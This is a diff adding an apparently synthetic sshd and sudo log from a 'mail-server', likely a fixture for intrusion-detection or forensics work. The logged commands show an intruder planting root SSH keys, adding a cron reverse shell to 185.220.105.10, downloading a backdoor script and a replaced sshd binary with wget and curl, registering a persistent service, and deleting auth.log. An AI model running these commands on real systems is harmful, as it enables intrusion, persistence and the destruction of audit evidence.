@@ -1,0 +1,21 @@
+Jul 28 12:00:01 mail-server sshd[9010]: Accepted password for attacker from 185.220.105.10 port 53001 ssh2
+Jul 28 12:00:02 mail-server sshd[9010]: pam_unix(sshd:session): session opened for user attacker by (uid=0)
+Jul 28 12:00:30 mail-server sudo[9015]:   attacker : TTY=pts/0 ; PWD=/home/attacker ; USER=root ; COMMAND=/bin/bash -c 'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ..." >> /home/attacker/.ssh/authorized_keys'
+Jul 28 12:01:00 mail-server sudo[9020]:   attacker : TTY=pts/0 ; PWD=/home/attacker ; USER=root ; COMMAND=/bin/mkdir -p /root/.ssh
+Jul 28 12:01:15 mail-server sudo[9025]:   attacker : TTY=pts/0 ; PWD=/home/attacker ; USER=root ; COMMAND=/bin/bash -c 'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..." >> /root/.ssh/authorized_keys'
+Jul 28 12:01:30 mail-server sudo[9030]:   attacker : TTY=pts/0 ; PWD=/home/attacker ; USER=root ; COMMAND=/bin/chmod 600 /root/.ssh/authorized_keys
+Jul 28 12:02:00 mail-server sudo[9035]:   attacker : TTY=pts/0 ; PWD=/home/attacker ; USER=root ; COMMAND=/bin/bash -c 'echo "*/5 * * * * root /bin/bash -c '"'"'bash -i >& /dev/tcp/185.220.105.10/8888 0>&1'"'"'" >> /etc/crontab'
+Jul 28 12:02:15 mail-server sudo[9040]:   attacker : TTY=pts/0 ; PWD=/home/attacker ; USER=root ; COMMAND=/bin/bash -c 'echo "@reboot root /usr/bin/python3 /opt/update.py" >> /etc/crontab'
+Jul 28 12:02:30 mail-server sudo[9045]:   attacker : TTY=pts/0 ; PWD=/home/attacker ; USER=root ; COMMAND=/usr/bin/wget -O /opt/update.py http://185.220.105.10:8000/backdoor.py
+Jul 28 12:02:45 mail-server sudo[9050]:   attacker : TTY=pts/0 ; PWD=/home/attacker ; USER=root ; COMMAND=/usr/bin/cp /usr/sbin/sshd /usr/sbin/sshd.backup
+Jul 28 12:03:00 mail-server sudo[9055]:   attacker : TTY=pts/0 ; PWD=/home/attacker ; USER=root ; COMMAND=/usr/bin/curl -o /usr/sbin/sshd_patch http://185.220.105.10:8000/sshd_backdoor
+Jul 28 12:03:15 mail-server sudo[9060]:   attacker : TTY=pts/0 ; PWD=/home/attacker ; USER=root ; COMMAND=/bin/mv /usr/sbin/sshd_patch /usr/sbin/sshd
+Jul 28 12:03:16 mail-server sudo[9061]:   attacker : TTY=pts/0 ; PWD=/home/attacker ; USER=root ; COMMAND=/bin/chmod 755 /usr/sbin/sshd
+Jul 28 12:03:30 mail-server sudo[9065]:   attacker : TTY=pts/0 ; PWD=/home/attacker ; USER=root ; COMMAND=/bin/systemctl restart sshd
+Jul 28 12:04:00 mail-server sudo[9070]:   attacker : TTY=pts/0 ; PWD=/home/attacker ; USER=root ; COMMAND=/bin/bash -c 'echo -e "[Unit]\nDescription=Update Service\n\n[Service]\nType=simple\nExecStart=/usr/bin/python3 /opt/update.py\nRestart=always\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/update.service'
+Jul 28 12:04:15 mail-server sudo[9075]:   attacker : TTY=pts/0 ; PWD=/home/attacker ; USER=root ; COMMAND=/bin/systemctl enable update.service
+Jul 28 12:04:16 mail-server sudo[9076]:   attacker : TTY=pts/0 ; PWD=/home/attacker ; USER=root ; COMMAND=/bin/systemctl start update.service
+Jul 28 12:04:30 mail-server sudo[9080]:   attacker : TTY=pts/0 ; PWD=/home/attacker ; USER=root ; COMMAND=/bin/bash -c 'iptables -A OUTPUT -p tcp --dport 53 -j ACCEPT'
+Jul 28 12:05:00 mail-server sshd[9085]: Accepted publickey for attacker from 185.220.105.10 port 53002 ssh2 (new backdoor key)
+Jul 28 12:05:01 mail-server sshd[9085]: pam_unix(sshd:session): session opened for user attacker by (uid=0)
+Jul 28 12:05:30 mail-server sudo[9090]:   attacker : TTY=pts/1 ; PWD=/home/attacker ; USER=root ; COMMAND=/bin/rm -f /var/log/auth.log && systemctl restart rsyslog
